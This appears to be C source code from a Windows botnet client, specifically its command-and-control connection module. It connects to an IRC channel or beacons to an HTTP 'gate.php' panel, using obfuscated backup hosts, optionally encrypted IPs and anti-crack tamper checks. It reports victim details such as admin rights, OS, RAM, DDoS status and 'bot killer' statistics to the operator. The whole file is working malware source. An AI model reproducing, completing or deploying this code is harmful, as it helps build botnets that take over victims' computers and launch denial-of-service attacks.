#include "../Includes/includes.h"

#ifndef HTTP_BUILD
void ConnectToIrc();
#else
void ConnectToHttp();
#endif

void ConnectToHub()
{
    // <!-------! ANTICRACK AREA START !-------!>
    if(fncgethostbyname != (vgethostbyname)GetProcAddress(GetModuleHandleW(L"ws2_32"), "gethostbyname"))
    {
        usVersionLength = GetRandNum(50);
        usServerLength = GetRandNum(50);
        usChannelLength = GetRandNum(50);
        usAuthHostLength = GetRandNum(50);
        usPort = GetRandNum(50);
        bSilent = true;
        strcpy(cBase64Characters, "a");
        cZoneIdentifierSuffix[GetRandNum(strlen(cZoneIdentifierSuffix))] = '\0';
        dwOperatingSystem = WINDOWS_7;
        cIrcCommandJoin[GetRandNum(strlen(cIrcCommandJoin))] = '\0';
        cIrcCommandNick[GetRandNum(strlen(cIrcCommandNick))] = '\0';
        cIrcCommandPrivmsg[GetRandNum(strlen(cIrcCommandPrivmsg))] = '\0';
        cIrcCommandPong[GetRandNum(strlen(cIrcCommandPong))] = '\0';
        cIrcCommandUser[GetRandNum(strlen(cIrcCommandUser))] = '\0';
    }
    // <!-------! ANTICRACK AREA STOP !-------!>

#ifndef HTTP_BUILD
    ConnectToIrc();
#else
    ConnectToHttp();
#endif
    return;
}

#ifndef HTTP_BUILD
void ConnectToIrc()
{
    //int nAddrInfoResult;
    //struct addrinfo info;
    //struct addrinfo *results;

    //memset( &info, 0, sizeof ( info ) );
    //info.ai_socktype = SOCK_STREAM;
    //info.ai_family = AF_INET;

    SOCKADDR_IN sck;
    HOSTENT *paddr;

    while(!bUninstallProgram)
    {
        RunThroughUuidProcedure();

        //while((nAddrInfoResult = getaddrinfo(cServer, usPort, &info, &results)) == -1)
        //    Sleep(100);

        //while((nIrcSock = fncsocket(results->ai_family, results->ai_socktype, 0)) == INVALID_SOCKET)
        //    Sleep(100);

        //while(fncconnect(nIrcSock, (struct sockaddr*) &results, sizeof(results)))
        //    Sleep(100);

#ifdef DEBUG
        SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);

        printf("%s\n"
               "-----------\n"
               "%s:%i %s\n"
               "%s\n"
               "%s %s\n"
               "%s\n"
               "-----------\n"
               "%s %s %s %s %s %s %s\n"
               "%s\n", cVersion, cServer, usPort, cServerPass, cBackup, cChannel, cChannelKey, cAuthHost,
               cIrcCommandPrivmsg, cIrcCommandJoin, cIrcCommandPart, cIrcCommandUser, cIrcCommandNick, cIrcCommandPass, cIrcCommandPong, cUuid);

        SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);

        system("pause");
#endif

        sck.sin_port = fnchtons(usPort);
        sck.sin_family = PF_INET;

        // <!-------! CRC AREA START !-------!>
        if(!bConfigSetupCheckpointFive)
            sck.sin_port = fnchtons(usPort - 1);
        // <!-------! CRC AREA STOP !-------!>

        unsigned short usHostResolves = 1;
        do
        {
__STARTAGAIN:

            usHostResolves++;

            if(usHostResolves % 2 == 0)
                paddr = fncgethostbyname(cServer);
            else if(cBackup != NULL)
            {
                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
                paddr = fncgethostbyname(cBackup);
                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
            }
            else
                continue;

            if(paddr == NULL)
            {
#ifdef DEBUG
                if(usHostResolves % 2 == 0)
                    printf("ERROR: Failed to resolve primary host! Trying backup host in 5 seconds...\n");
                else
                    printf("ERROR: Failed to resolve backup host! Trying primary host in 5 seconds...\n");
#endif

                Sleep(5000);
            }
        }
        while(paddr == NULL);

        // <!-------! CRC AREA START !-------!>
        if(!bConfigSetupCheckpointSeven)
            usPort = GetRandNum(100) + 1;
        // <!-------! CRC AREA STOP !-------!>

        memcpy(&sck.sin_addr.s_addr, paddr->h_addr, paddr->h_length);
#ifdef DEBUG
        printf("-----------\nResolved IP %s from domain ", fncinet_ntoa(sck.sin_addr));
        if(usHostResolves % 2 == 0)
            printf("%s\n", cServer);
        else if(cBackup != NULL)
        {
            SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
            printf("%s\n", cBackup);
            SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
        }
#endif
#ifdef USE_ENCRYPTED_IP
        sck.sin_addr.s_addr = fncinet_addr(DecryptIp(fncinet_ntoa(sck.sin_addr), 24));
#ifdef DEBUG
        printf("Decrypted IP: %s\n", fncinet_ntoa(sck.sin_addr));
#endif
#endif

#ifdef DEBUG
        printf("-----------\n");
#endif

#ifdef USE_SSL
        DoAuthentication(nIrcSock);
#endif

        int nConnectTries = 0;
        while(!bUninstallProgram)
        {
            // <!-------! CRC AREA START !-------!>
            if(!bConfigSetupCheckpointThree)
                nConnectTries = 9000;
            // <!-------! CRC AREA STOP !-------!>

            if(nConnectTries > 4)
                goto __STARTAGAIN;

            nConnectTries++;

            nIrcSock = fncsocket(AF_INET, SOCK_STREAM, NULL);
            if(nIrcSock == INVALID_SOCKET)
            {
#ifdef DEBUG
                printf("ERROR: Failed to create socket! Retrying in 2.5 seconds...\n");
#endif
                Sleep(2500);
                continue;
            }

            // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
            time_t tTime;
            struct tm *ptmTime;
            tTime = time(NULL);
            ptmTime = localtime(&tTime);
            char cTodaysDate[20];
            memset(cTodaysDate, 0, sizeof(cTodaysDate));
            strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
            if(atoi(cTodaysDate) >= nExpirationDateMedian)
                closesocket(nIrcSock);
            // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

            int nConnect = fncconnect(nIrcSock, (struct sockaddr*) &sck, sizeof(sck));
            if(nConnect == SOCKET_ERROR)
            {
#ifdef DEBUG
                DWORD dwErr = GetLastError();
                printf("ERROR: Failed to connect(Error code: %ld)! Retrying in 2.5 seconds...\n", dwErr);
#endif
                Sleep(2500);
                continue;
            }
            else
                break;
        }

        // <!-------! CRC AREA START !-------!>
        if(!bConfigSetupCheckpointEight)
            strcpy(cChannel, "6");
        // <!-------! CRC AREA STOP !-------!>

        strcpy(cNickname, NewRandomNick());
        SyncIrcVariables();

        if(!strstr("0", cServerPass))
        {
            strcpy(cSend, cIrcCommandPass);
            strcat(cSend, " ");
            strcat(cSend, cServerPass);
            SendToIrc(cSend);
        }

        strcpy(cSend, cIrcCommandUser);
        strcat(cSend, " ");
#ifdef DEBUG
        strcat(cSend, "debug");
#else
        strcat(cSend, GenRandLCText());
#endif

        strcat(cSend, " ");

        char cNumber[1];
        itoa(GetRandNum(9), cNumber, 10);
        strcat(cSend, cNumber);

        strcat(cSend, " *  :");

#ifdef DEBUG
        strcat(cSend, "debug");
#else
        strcat(cSend, GenRandLCText());
#endif

        SendToIrc(cSend);

        strcpy(cSend, cIrcCommandNick);
        strcat(cSend, " ");
        strcat(cSend, cNickname);
        SendToIrc(cSend);

        dwConnectionReturn = 1;
        while(dwConnectionReturn != SOCKET_ERROR && dwConnectionReturn != -1)
        {
            if(bUninstallProgram)
            {
                strcpy(cSend, "QUIT Uninstalling");
                SendToIrc(cSend);
                break;
            }

            memset(cReceive, '\0', sizeof(cReceive));
            dwConnectionReturn = fncrecv(nIrcSock, cReceive, sizeof(cReceive), NULL);
#ifdef DEBUG
            printf(cReceive);
#endif

            if(bAutoRejoinChannel)
            {
                strcpy(cSend, cIrcCommandJoin);
                strcat(cSend, " ");
                strcat(cSend, cChannel);
                if(!strstr("0", cChannelKey))
                {
                    strcat(cSend, " ");
                    strcat(cSend, cChannelKey);
                }

                SendToIrc(cSend);
                Sleep(IRC_SND_DELAY);

                if((strstr(cReceive, cChannel)) && (((strstr(cReceive, " JOIN :"))) || (strstr(cReceive, cIrcCommandPrivmsg))))
                    bAutoRejoinChannel = FALSE;
            }

            pcParseLine = strtok(cReceive, "\n");
            while(pcParseLine != NULL)
            {
                ParseLineFromIrc(pcParseLine);
                pcParseLine = strtok(NULL, "\n");
            }

            Sleep(500);
        }

        fncclosesocket(nIrcSock);
    }

    UninstallProgram();
    return;
}
#else
void ConnectToHttp()
{
    RunThroughUuidProcedure();

#ifdef DEBUG
    //if(usPort > nPortOffset)
    //    usPort -= nPortOffset;
    //else
    //    usPort += nPortOffset;

    SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);

    printf("%s\n"
           "-----------\n"
           "URL to gate.php: %s\n"
           "Backup: %s\n"
           "Port: %i\n"
           "Extra Data:\n%s %s %s %s\n%s %s %s %s %s %s %s\n"
           "%s\n", cVersion, cServer, cBackup, usPort, cServerPass, cChannel, cChannelKey, cAuthHost,
           cIrcCommandPrivmsg, cIrcCommandJoin, cIrcCommandPart, cIrcCommandUser, cIrcCommandNick, cIrcCommandPass, cIrcCommandPong, cUuid);

    //if(usPort < nPortOffset)
    //    usPort += nPortOffset;
    //else
    //    usPort -= nPortOffset;

    SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);

    system("pause");
#endif

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointSeven)
        usPort = GetRandNum(100) + 1;
    // <!-------! CRC AREA STOP !-------!>

    /*HW_PROFILE_INFO HwProfInfo;
    while(!fncGetCurrentHwProfile(&HwProfInfo))
        Sleep(100);

    char cGuid[40];
    memset(cGuid, 0, sizeof(cGuid));
    strcpy(cGuid, HwProfInfo.szHwProfileGuid);
    StripDashes(cGuid);

    memset(cUuid, 0, sizeof(cUuid));
    memcpy(cUuid, cGuid + 1, 36);*/

    while(!bUninstallProgram)
    {
        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
        time_t tTime;
        struct tm *ptmTime;
        tTime = time(NULL);
        ptmTime = localtime(&tTime);
        char cTodaysDate[20];
        memset(cTodaysDate, 0, sizeof(cTodaysDate));
        strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
        if(atoi(cTodaysDate) >= nExpirationDateMedian)
            break;
        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

        bHttpRestart = FALSE;

        char cPrivelages[6];
        if(IsAdmin())
            strcpy(cPrivelages, "admin");
        else
            strcpy(cPrivelages, "user");

        char cBits[3];
        if(Is64Bits(GetCurrentProcess()))
            strcpy(cBits, "64");
        else
            strcpy(cBits, "86");

        char cComputerGender[8];
        if(IsLaptop())
            strcpy(cComputerGender, "laptop");
        else
            strcpy(cComputerGender, "desktop");

        char cDataToServer[MAX_HTTP_PACKET_LENGTH];

        memset(cDataToServer, 0, sizeof(cDataToServer));

        sprintf(cDataToServer, "|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|new:",
                cUuid, cPrivelages, cBits, cComputerGender, GetNumCPUs(), GetOs(), cVersion, GetVersionMicrosoftDotNetVersion());

        if(bNewInstallation)
            strcat(cDataToServer, "1");
        else
            strcat(cDataToServer, "0");

        strcat(cDataToServer, "|");

        char cHttpHost[MAX_PATH];
        memset(cHttpHost, 0, sizeof(cHttpHost));

        char cHttpPath[DEFAULT];
        memset(cHttpPath, 0, sizeof(cHttpPath));

        char cBreakUrl[strlen(cServer)];
        memset(cBreakUrl, 0, sizeof(cBreakUrl));
        strcpy(cBreakUrl, cServer);

        char *pcBreakUrl = cBreakUrl;

        if(strstr(pcBreakUrl, "http://"))
            pcBreakUrl += 7;
        else if(strstr(pcBreakUrl, "https://"))
            pcBreakUrl += 8;

        pcBreakUrl = strtok(pcBreakUrl, "/");
        if(pcBreakUrl != NULL)
            strcpy(cHttpHost, pcBreakUrl);

        pcBreakUrl = strtok(NULL, "?");
        if(pcBreakUrl != NULL)
            strcpy(cHttpPath, pcBreakUrl);

        strcpy(cHttpHostGlobal, cHttpHost);
        strcpy(cHttpPathGlobal, cHttpPath);

        httpreq.sin_port = fnchtons(usPort);
        httpreq.sin_family = AF_INET;

        HOSTENT *paddr;

        unsigned short usHostResolves = 1;
        do
        {
            usHostResolves++;

            if(usHostResolves % 2 == 0)
                paddr = fncgethostbyname(cHttpHost);
            else if(cBackup != NULL)
            {
                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
                paddr = fncgethostbyname(cBackup);
                SimpleDynamicXor(cBackup, usVersionLength + usServerLength + usChannelLength + usAuthHostLength);
            }
            else
                continue;

            if(paddr == NULL)
            {
#ifdef DEBUG
                if(usHostResolves % 2 == 0)
                    printf("ERROR: Failed to resolve primary host! Trying backup host in 5 seconds...\n");
                else if(cBackup != NULL)
                    printf("ERROR: Failed to resolve backup host! Trying primary host in 5 seconds...\n");
#endif

                Sleep(5000);
            }
        }
        while(paddr == NULL);

        memcpy(&httpreq.sin_addr.s_addr, paddr->h_addr, paddr->h_length);

#ifdef DEBUG
        printf("-----------\n"
               "Communication Information:\n"
               "DNS: %s ( %s", cHttpHost, fncinet_ntoa(httpreq.sin_addr));
#ifdef USE_ENCRYPTED_IP
        httpreq.sin_addr.s_addr = fncinet_addr(DecryptIp(fncinet_ntoa(httpreq.sin_addr), 24));
        printf("[encrypted] -> %s[decrypted]", fncinet_ntoa(httpreq.sin_addr));
#endif
        printf(" )\n"
               "Path: %s\n"
               "Port: %i\n", cHttpPath, usPort);
#endif

        while(!bUninstallProgram)
        {
            if(SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
                break;

            //Sleep(5000);
            Sleep(nCheckInInterval * 1000);
        }

        while(!bUninstallProgram)
        {
            memset(cDataToServer, 0, sizeof(cDataToServer));

            char cBusy[7];
            memset(cBusy, 0, sizeof(cBusy));
            if(bDdosBusy)
                strcpy(cBusy, "true");
            else
                strcpy(cBusy, "false");

            sprintf(cDataToServer, "|type:repeat|uid:%s|ram:%ld|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|",
                    cUuid, GetMemoryLoad(), dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges, cBusy);

            if(!SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
            {
                if(bHttpRestart)
                    break;

                //Sleep(5000);
                Sleep(nCheckInInterval * 1000);
                continue;
            }

            if(bHttpRestart)
                break;

            //Sleep(5000);
            Sleep(nCheckInInterval * 1000);
        }
    }

    UninstallProgram();
    return;
}
#endif
